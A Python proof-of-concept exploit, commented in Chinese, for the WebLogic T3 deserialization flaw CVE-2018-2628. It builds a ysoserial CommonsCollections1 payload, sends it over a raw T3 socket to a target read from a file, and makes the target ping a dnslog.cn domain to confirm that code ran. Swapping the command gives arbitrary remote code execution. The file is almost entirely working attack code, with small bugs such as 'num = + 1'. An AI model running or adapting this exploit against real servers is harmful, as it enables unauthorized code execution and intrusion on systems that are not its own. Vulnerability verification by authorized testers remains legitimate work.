import random
import struct   # 负责大小端的转换
import subprocess
import socket
import re
import binascii
import requests
import time


class T3_poc:
    def __init__(self):
        self.YSO_PATH = "../jar/ysoserial-master.jar"
        with open('../opt/前端传url.txt','r') as file:
            self.url = file.readline()
            mati = "(?<=//)\d+\.\d+\.\d+\.\d+"
            self.ip = re.findall(mati,self.url)[0]
            matp = "(?<=:)\d+"
            self.port = re.findall(matp,self.url)[0]
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"         # 构造请求头
            }
        self.a = random.uniform(1, 10)
        dns_url = f"http://dnslog.cn/getdomain.php?t={self.a}"        # 访问dns_log
        response = requests.get(url=dns_url, headers=headers)
        self.res = response.text                                                # 获取dns
        set_cookie = response.headers['Set-Cookie']                             # 获取Set-Cookie
        agex = ".*(?=;)"
        self.set_c = re.findall(agex, set_cookie)[0]                            # 获取PHPSESSID用以获取结果
        # print(self.res)
        # print(self.set_c)
        self.gadget = "CommonsCollections1"                                     # 指定使用CommonsCollections1反序列化利用链
        self.cmd = f"ping -n 1 -w 1 {self.res}"                                 # 让被攻击服务器执行的指定命令
        popen = subprocess.Popen(['C:\Program Files\Java\jre1.8.0_361\\bin\java.exe', '-jar', self.YSO_PATH, self.gadget, self.cmd], stdout=subprocess.PIPE)
        # 'C:\Program Files\Java\jre1.8.0_361\\bin\java.exe' 改为java，或java路径
        self.payload = popen.stdout.read()

    def T3Exploit(self):
        sock =socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # 初始化socket，前者指定用于服务器与服务器之间的网络通信，后者指定基于TCP的流式socket通信
        sock.connect((self.ip, int(self.port)))  # 建立socket连接
        handshake = "t3 12.2.3\nAS:255\nHL:19\nMS:10000000\n\n"  # socket握手消息
        sock.sendall(handshake.encode())
        data = sock.recv(1024)   # 接收第一个socket数据包，HELO
        data1 = sock.recv(1024)  # 接收第二个socket数据包，:10.3.6.0.false
        isweblogic = re.compile("HELO").findall(data.decode())   # 匹配字段中有无HELO
        version = re.compile(":(.*).0.false").findall(data1.decode())  # 使用正则匹配服务器握手消息中返回的weblogic版本号
        if isweblogic and version:
            print("WebLogic: "+"".join(version))  # 输出weblogic版本号
        else:
            print("Not WebLogic")  # 对端可能不是weblogic
        header = binascii.a2b_hex(b"00000000")  # 先占位4个字节，这四个字节表示数据包长度
        # 以下为t3协议头
        t3header = binascii.a2b_hex(b"016501ffffffffffffffff000000690000ea60000000184e1cac5d00dbae7b5fb5f04d7a1678d3b7d14d11bf136d67027973720078720178720278700000000a000000030000000000000006007070707070700000000a000000030000000000000006007006")
        desflag = binascii.a2b_hex(b"fe010000")  # 反序列化数据标志 fe010000，
        payload = header + t3header + desflag + self.payload  # 将各部分拼接，将ysoserial生成payload添加到后面
        # 计算payload长度，并将长度字段放于前四个字节
        payload = struct.pack(">I", len(payload)) + payload[4:]
        sock.send(payload)

    def cve_poc(self):
        T3_poc.T3Exploit()
        num = 0
        while True:           # 一直循环
            dns_headers = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Cookie": self.set_c  # 用指定的PHPSESSID获取DNS_log结果
                }
            res_dns_url = f"http://dnslog.cn/getrecords.php?t={self.a}"
            res = requests.get(url=res_dns_url, headers=dns_headers)
            # print(res.text)
            if self.res in res.text:
                a = "存在CVE-2018-2628漏洞"
                print(a)
                return a
            else:
                num = + 1
                time.sleep(1)
                if num > 10:  # 最多10次就退出
                    break


T3_poc = T3_poc()
T3_poc.cve_poc()

